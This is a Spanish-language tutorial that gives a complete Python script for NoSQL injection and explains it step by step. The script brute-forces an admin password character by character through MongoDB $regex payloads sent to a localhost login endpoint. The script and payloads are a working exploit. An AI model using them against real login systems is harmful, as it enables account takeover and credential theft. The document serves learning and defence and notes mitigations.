
---
```python
#!/usr/bin/env python3

from pwn import *
import requests, time, sys, signal, string

# Ctrl+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#variables globales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24):
        for character in characters:

            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeNoSQLI()
```

---

# Explicación del script de fuerza bruta NoSQLi

Este script en Python automatiza un ataque de **fuerza bruta con inyección NoSQL** para extraer la contraseña de un usuario (en este caso `admin`) en una aplicación vulnerable. Ver [NoSQLi](NoSQLi.md)

---

## Dependencias

El script utiliza las siguientes librerías:

- **pwn** (`from pwn import *`): se usa para imprimir mensajes interactivos en consola (`log.progress`).
- **requests**: para realizar las peticiones HTTP.
- **time**: para introducir pausas controladas.
- **sys** y **signal**: para gestionar la salida limpia del programa al pulsar `Ctrl+C`.
- **string**: para obtener un conjunto de caracteres a probar (minúsculas, mayúsculas y dígitos).

---

## Flujo del programa

### 1. Manejo de interrupción
```python
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
````

* Permite que al presionar `Ctrl+C` se interrumpa el ataque y el script salga de forma ordenada mostrando un mensaje.

---

### 2. Variables globales

```python
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
```

* **login\_url**: URL de login donde se enviarán las peticiones maliciosas.
* **characters**: diccionario de ataque con letras mayúsculas, minúsculas y números que se usarán para probar cada posición de la contraseña.

---

### 3. Función `makeNoSQLI`

```python
def makeNoSQLI():
    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")
```

* Inicializa `password` como vacío (se irá construyendo carácter a carácter).
* `p1` muestra el progreso general de la fuerza bruta.
* `p2` va mostrando en tiempo real la contraseña descubierta.

---

### 4. Bucle de fuerza bruta

```python
for position in range(0, 24):
    for character in characters:
        post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
        p1.status(post_data)
        headers = {'Content-Type': 'application/json'}
        r = requests.post(login_url, headers=headers, data=post_data)
```

* **Primer bucle (`for position in range(0, 24)`)**: asume que la contraseña tiene una longitud máxima de 24 caracteres.
* **Segundo bucle (`for character in characters`)**: prueba cada posible carácter para la posición actual.
* **Payload inyectado**:

  ```json
  {
    "username": "admin",
    "password": { "$regex": "^<password+caracter>" }
  }
  ```

  Esto fuerza al motor NoSQL a comprobar si la contraseña de `admin` **empieza por la cadena parcial descubierta hasta ahora más el carácter actual**.

---

### 5. Validación de respuesta

```python
if "Logged in as user" in r.text:
    password += character
    p2.status(password)
    break
```

* Si la respuesta contiene el texto `Logged in as user`, significa que el patrón es correcto.
* Se añade el carácter descubierto a la variable `password`.
* Se muestra el progreso de la contraseña.
* El bucle interno se rompe (`break`) para pasar a la siguiente posición.

---

## Ejecución

```python
if __name__ == '__main__':
    makeNoSQLI()
```

* Ejecuta la función principal al correr el script directamente.

---

## Resumen del ataque

1. Se aprovecha que el campo `password` en la aplicación vulnerable se evalúa con **operadores MongoDB**.
2. Se construyen expresiones regulares con `$regex` para comprobar el prefijo correcto de la contraseña.
3. Se avanza carácter por carácter hasta reconstruir toda la contraseña de `admin`.
4. El ataque se detiene cuando se alcanza la longitud establecida (24 caracteres en este caso).

---

## Puntos clave

* Este ataque **no adivina la contraseña completa de una sola vez**, sino que la construye progresivamente.
* Se basa en **respuestas booleanas implícitas** (cuando la aplicación responde distinto según si el regex coincide o no).
* Es un ataque **costo intensivo** en número de peticiones, pero muy efectivo si la aplicación no implementa medidas de seguridad como límites de intentos, WAF o validación estricta de entradas.

---
